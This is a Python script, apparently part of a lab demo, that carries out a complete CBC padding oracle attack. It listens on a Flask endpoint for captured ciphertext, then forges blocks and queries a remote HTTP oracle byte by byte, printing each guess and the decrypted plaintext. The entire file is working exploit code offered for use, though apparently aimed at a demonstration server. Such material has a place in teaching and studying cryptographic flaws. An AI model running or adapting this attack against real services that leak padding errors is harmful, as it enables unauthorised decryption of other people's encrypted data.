#!/usr/bin/env python3
"""
Padding Oracle Attacker
Run in Terminal 2. Receives ciphertext from the sender,
then decrypts it using the CBC padding oracle attack.
Prints each step: every byte guess that gets a 'valid' response from the oracle.
"""

import threading
import logging
import socket
import time
from flask import Flask, request, jsonify
import requests as http_req

# --- Config ---
BLOCK_SIZE = 16
LISTEN_HOST = "0.0.0.0"
ORACLE_PORT = 5000
LISTEN_PORT = 5001

app = Flask(__name__)
logging.getLogger("werkzeug").setLevel(logging.ERROR)

captured_event = threading.Event()
captured_hex = {"value": ""}


@app.route("/capture", methods=["POST"])
def capture():
    ct_hex = request.get_json(force=True).get("ciphertext", "")
    if ct_hex:
        captured_hex["value"] = ct_hex
        captured_event.set()
    return jsonify({"status": "ok"})


def fmt(data):
    return " ".join(str(b) for b in data)


def get_local_ip():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect(("8.8.8.8", 80))
        return sock.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        sock.close()


def ask_oracle(two_blocks):
    try:
        resp = http_req.post(app.config["ORACLE_URL"], json={"ciphertext": two_blocks.hex()}, timeout=10)
        return resp.json().get("valid", False)
    except Exception:
        return False


def padding_oracle_attack(ct_hex):
    data = bytes.fromhex(ct_hex)
    blocks = [data[i:i + BLOCK_SIZE] for i in range(0, len(data), BLOCK_SIZE)]
    num_ct_blocks = len(blocks) - 1

    print("\n" + "=" * 60)
    print("PADDING ORACLE ATTACK")
    print(f"Ciphertext : {fmt(data)}")
    print(f"Blocks     : 1 IV + {num_ct_blocks} ciphertext")
    print("=" * 60)
    query_count = 0
    plaintext = b""
    t0 = time.time()

    for blk_num in range(1, len(blocks)):
        prev_block = blocks[blk_num - 1]
        target_block = blocks[blk_num]
        inter = bytearray(BLOCK_SIZE)
        print(f"\n--- Block {blk_num} of {num_ct_blocks} ---")
        for pos in range(BLOCK_SIZE - 1, -1, -1):
            pad_val = BLOCK_SIZE - pos
            crafted = bytearray(BLOCK_SIZE)
            for j in range(pos + 1, BLOCK_SIZE):
                crafted[j] = inter[j] ^ pad_val

            ok = False
            for guess in range(256):
                crafted[pos] = guess
                forged = bytes(crafted) + target_block
                query_count += 1
                if not ask_oracle(forged):
                    continue

                if pos == BLOCK_SIZE - 1:
                    check = bytearray(crafted)
                    check[pos - 1] ^= 1
                    query_count += 1
                    if not ask_oracle(bytes(check) + target_block):
                        continue

                inter[pos] = guess ^ pad_val
                p = prev_block[pos] ^ inter[pos]
                ch = chr(p) if 32 <= p < 127 else "."
                print(f"  Byte {BLOCK_SIZE - pos:2d}/16 -> {p} ('{ch}')  queries={query_count}")
                ok = True
                break

            if not ok:
                print(f"FAILED at byte position {pos}")
                return

        pt_block = bytes(prev_block[i] ^ inter[i] for i in range(BLOCK_SIZE))
        plaintext += pt_block
        print(f"Recovered block: {fmt(pt_block)}")

    p = plaintext[-1]
    if 1 <= p <= BLOCK_SIZE and plaintext[-p:] == bytes([p]) * p:
        plaintext = plaintext[:-p]

    print("\n" + "=" * 60)
    print("RESULT")
    print(f"Decrypted bytes : {fmt(plaintext)}")
    try:
        print(f"Decrypted text  : {plaintext.decode()}")
    except UnicodeDecodeError:
        pass
    print(f"Total queries   : {query_count}")
    print(f"Time            : {time.time() - t0:.2f}s")
    print("=" * 60 + "\n")


def main():
    local_ip = get_local_ip()
    server_ip = input("Enter server PC IP (blank for localhost): ").strip() or "127.0.0.1"
    app.config["ORACLE_URL"] = f"http://{server_ip}:{ORACLE_PORT}/oracle"

    threading.Thread(
        target=lambda: app.run(host=LISTEN_HOST, port=LISTEN_PORT, threaded=True),
        daemon=True,
    ).start()

    print("=" * 60)
    print("ATTACKER — PADDING ORACLE")
    print(f"This PC IP : {local_ip}")
    print(f"Oracle URL : {app.config['ORACLE_URL']}")
    print(f"Listening  : http://{local_ip}:{LISTEN_PORT}/capture")
    print("=" * 60)
    print("\nWaiting for ciphertext...\n")

    while True:
        captured_event.wait()
        captured_event.clear()

        ct_hex = captured_hex["value"]
        ct_bytes = bytes.fromhex(ct_hex)
        print(f"Ciphertext received: {fmt(ct_bytes)}")

        padding_oracle_attack(ct_hex)

        print("Waiting for next ciphertext...\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nBye.")
